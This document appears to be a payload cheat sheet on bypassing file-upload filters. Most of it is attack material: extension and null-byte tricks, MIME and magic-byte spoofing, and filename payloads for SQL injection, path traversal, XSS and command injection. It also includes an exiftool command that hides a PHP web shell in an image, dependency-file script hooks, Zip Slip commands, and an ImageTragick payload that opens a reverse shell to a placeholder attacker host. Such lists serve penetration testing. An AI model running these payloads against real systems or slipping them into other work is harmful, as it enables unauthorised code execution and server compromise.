# File Upload
### Defaults extensions
* PHP Server
```html
.php
.php3
.php4
.php5
.php7

# Less known PHP extensions
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc

```

* ASP Server
```html
.asp
.aspx
.config
.cer and .asa # (IIS <= 7.5)
shell.aspx;1.jpg # (IIS < 7.0)
shell.soap

```
* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
* Perl: `.pl, .pm, .cgi, .lib`
* Coldfusion: `.cfm, .cfml, .cfc, .dbm`
* Node.js: `.js, .json, .node`

## Upload tricks
* Use double extensions : `.jpg.php, .png.php5`
* Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
* Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`
* Null byte (works well against `pathinfo())`
  * `.php%00.gif`
  * `.php\x00.gif`
  * `.php%00.png`
  * `.php\x00.png`
  * `.php%00.jpg`
  * `.php\x00.jpg`
* Special characters
  * Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
  * Whitespace and new line characters
      * `file.php%20`
      * `file.php%0d%0a.jpg`
      * `file.php%0a`
  * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
  * Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
  * Multiple special characters: `file.jsp/././././.`
* Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
  * `Content-Type : image/gif`
  * `Content-Type : image/png`
  * `Content-Type : image/jpeg`
  * Content-Type wordlist: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
  * Set the Content-Type twice: once for unallowed type and once for allowed.
* [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
  * Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
    * PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
    * JPG: `\xff\xd8\xff`
    * GIF: `GIF87a` OR `GIF8;`
  * Shell can also be added in the metadata
* Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. "`file.asax:.jpg`"). This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "`file.asp::$data.`")

## Filename vulnerabilities
Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename.

* Time-Based SQLi Payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`
* LFI/Path Traversal Payloads: e.g. `image.png../../../../../../../etc/passwd`
* XSS Payloads e.g. `'"><img src=x onerror=alert(document.domain)>.extension`
* File Traversal e.g. `../../../tmp/lol.png`
* Command Injection e.g. `; sleep 10;`

Also you upload:

* HTML/SVG files to trigger an XSS
* EICAR file to check the presence of an antivirus

## Picture Compression
Create valid pictures hosting PHP code. Upload the picture and use a Local File Inclusion to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.

* Picture Metadata, hide the payload inside a comment tag in the metadata.
* Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating getimagesize() and imagecreatefromgif().
    * [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): use createBulletproofJPG.py
    * [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createPNGwithPLTE.php
    * [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createGIFwithGlobalColorTable.php


## Picture with custom metadata
Create a custom picture and insert exif tag with exiftool. A list of multiple exif tags can be found at exiv2.org
```bash
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

```

## Configuration Files
If you are trying to upload files to a :
* PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) trick to execute code.
* ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) trick to execute code.
* uWSGI server, take a look at the [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) trick to execute code.

Configuration files examples

* [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
* [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
* [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf)
* [__init__.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
* [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)

Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.

* package.json
```json
"scripts": {
    "prepare" : "/bin/touch /tmp/pwned.txt"
}

```
* composer.json
```json
"scripts": {
    "pre-command-run" : [
    "/bin/touch /tmp/pwned.txt"
    ]
}

```

## CVE - ImageMagick
If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.
* ImageTragik example: Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context

```
More payloads in the folder `Picture ImageMagick`

## CVE - FFMpeg
FFmpeg HLS vulnerability

## ZIP archive
When a ZIP/archive file is automatically decompressed after the upload
* Zip Slip: directory traversal to write a file somewhere else
```bash
python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15

ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt

```

## Jetty RCE
Upload the XML file to `$JETTY_BASE/webapps/`
* [JettyShell.xml - From Mikhail Klyuchnikov](https://raw.githubusercontent.com/Mike-n1/tips/main/JettyShell.xml)





## Tools
* [Fuxploider](https://github.com/almandin/fuxploider)
* [Burp > Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)
* [ZAP > FileUpload AddOn](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/)












